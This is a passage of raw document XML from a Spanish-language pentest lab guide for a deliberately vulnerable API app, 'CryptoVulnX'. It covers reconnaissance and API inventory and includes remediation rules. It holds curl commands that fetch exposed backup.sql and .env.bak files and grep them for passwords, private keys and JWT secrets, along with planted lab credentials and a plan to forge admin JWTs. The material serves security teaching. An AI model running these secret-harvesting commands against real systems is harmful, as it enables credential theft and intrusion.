    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Del backup</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/backup.sql | grep -E "password_plain|private_key|jwt_secret"</w:t>
        <w:br/>
        <w:br/>
        <w:t># De .env.bak y .env.old</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/.env.bak</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/.env.old</w:t>
        <w:br/>
        <w:br/>
        <w:t># De notes.txt</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/notes.txt | grep -i -E "secret|token|pass"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Del test.php</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/test.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 4: Componentes vulnerables</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s $TARGET/composer.lock | python -m json.tool | grep -E "version|cve_note"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Cada version tiene un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>_cve_note</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que documenta el CVE conocido (en el lab esta plantado para didactica; en pentest real usarias </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>safety check</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>npm audit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>composer audit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>osv-scanner</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Flags recolectados</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Esta fase deja los siguientes flags textuales (no criptograficos, sirven para auto-validacion):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FLAG-RECON-01  -&gt; en .env.bak (creds viejas siguen funcionando)</w:t>
        <w:br/>
        <w:t>FLAG-RECON-02  -&gt; en notes.txt (pista para fase 2: swagger)</w:t>
        <w:br/>
        <w:t>FLAG-RECON-03  -&gt; en TODO.md (pista para fase 3: endpoints admin via logs.php)</w:t>
        <w:br/>
        <w:t>FLAG-RECON-04  -&gt; en .git/COMMIT_EDITMSG (gitlab interno)</w:t>
        <w:br/>
        <w:t>FLAG-RECON-05  -&gt; en backup.sql (admin/admin123)</w:t>
        <w:br/>
        <w:t>FLAG-RECON-06  -&gt; en backup/db_*.sql (arquitectura interna)</w:t>
        <w:br/>
        <w:t>FLAG-RECON-07  -&gt; en adminer.php (creds DB en HTML comment)</w:t>
        <w:br/>
        <w:t>FLAG-RECON-08  -&gt; en .well-known/security.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Como esto encadena con las siguientes fases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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Hallazgo de Fase 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Habilita en Fase...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>JWT_SECRET=crypto123</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> (en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.git/logs/HEAD</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>notes.txt</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>test.php</w:t>
            </w:r>
            <w:r>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - LAB02 (forjar JWT)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>admin/admin123</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> (en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>backup.sql</w:t>
            </w:r>
            <w:r>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - LAB05 BFLA (login admin)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Listado de endpoints en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>notes.txt</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> y </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TODO.md</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 2 (verificar swagger) y Fase 3 (fuzzing dirigido)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Headers magicos en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>notes.txt</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Debug-Token</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Original-URL</w:t>
            </w:r>
            <w:r>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 4 (header fuzzing)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Query params en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>notes.txt</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?debug=1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?include=*</w:t>
            </w:r>
            <w:r>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 4 (param fuzzing)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Composer.lock con CVEs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - explotacion via libreria</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[apache]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># .htaccess - Bloquear archivos sensibles</w:t>
        <w:br/>
        <w:t>&lt;FilesMatch "^(\.|composer\.|backup|notes|TODO|.*\.bak|.*\.old|.*\.sql|.*\.swp).*$"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Require all denied</w:t>
        <w:br/>
        <w:t>&lt;/FilesMatch&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># Bloquear directorios de control de versiones</w:t>
        <w:br/>
        <w:t>RedirectMatch 404 /\.git</w:t>
        <w:br/>
        <w:t>RedirectMatch 404 /\.svn</w:t>
        <w:br/>
        <w:t>RedirectMatch 404 /\.hg</w:t>
        <w:br/>
        <w:br/>
        <w:t># Desactivar listing de directorios</w:t>
        <w:br/>
        <w:t>Options -Indexes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// Remover phpinfo.php, info.php, test.php, adminer.php del docroot</w:t>
        <w:br/>
        <w:t>// Mover backups fuera del docroot:</w:t>
        <w:br/>
        <w:t>//   mv backup/ /var/lib/cryptovulnx-backups/</w:t>
        <w:br/>
        <w:t>//   chmod 700 /var/lib/cryptovulnx-backups/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[dockerignore]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># .dockerignore - Excluir del build</w:t>
        <w:br/>
        <w:t>.git</w:t>
        <w:br/>
        <w:t>.env</w:t>
        <w:br/>
        <w:t>.env.bak</w:t>
        <w:br/>
        <w:t>.env.old</w:t>
        <w:br/>
        <w:t>.DS_Store</w:t>
        <w:br/>
        <w:t>notes.txt</w:t>
        <w:br/>
        <w:t>TODO.md</w:t>
        <w:br/>
        <w:t>backup</w:t>
        <w:br/>
        <w:t>backup.sql</w:t>
        <w:br/>
        <w:t>*.bak</w:t>
        <w:br/>
        <w:t>*.old</w:t>
        <w:br/>
        <w:t>*.swp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Fase 2 - Metodologia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 12 - API Inventory &amp; Version Fuzzing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Fase de la Metodologia: 2 - API INVENTORY</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Aplicar la segunda fase del pentest de API: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>descubrir versiones, ambientes y specs ocultas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> del API. Construir el inventario completo de endpoints (incluso los que el equipo no documenta) usando OpenAPI/Swagger filtrados, colecciones de Postman, y enumeracion de versiones (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>v1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>v2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>v3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>internal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dev</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>staging</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Esta fase responde: *"que APIs existen?"*. La fase 3 respondera *"que endpoints tiene cada una?"*.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OWASP API9:2023 (Improper Inventory Management) es una de las vulnerabilidades mas frecuentes en organizaciones medianas-grandes. Las causas tipicas:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Versiones beta/experimentales</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que se despliegan para QA y nunca se descomisionan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Specs publicos incompletos</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> vs </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>specs internos completos</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - alguien expone el interno por error.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ambientes paralelos</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (staging, dev, sandbox) con misma DB pero sin los mismos controles.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Microservicios "internos"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que quedan accesibles desde el LB publico.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Colecciones de Postman/Insomnia</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> publicadas en GitHub o expuestas en docroot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CryptoVulnX implementa los 5 patrones simultaneamente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Hallazgos esperados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Hallazgo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Como descubrirlo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Que rompe</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/swagger.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Wordlist </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>api-endpoints</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> o </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>quickhits.txt</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, o pista en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>security.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Lista los </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>x-internal-servers</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> con </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>v2</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>v3</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>internal</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>test</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>dev</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>staging</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/openapi.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Pista en swagger.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Lista TODOS los endpoints + headers magicos + cookies magicas + campos mass-assignable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/postman_collection.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Wordlist comun</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">JWT admin firmado con </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>crypto123</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> + tokens admin/internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
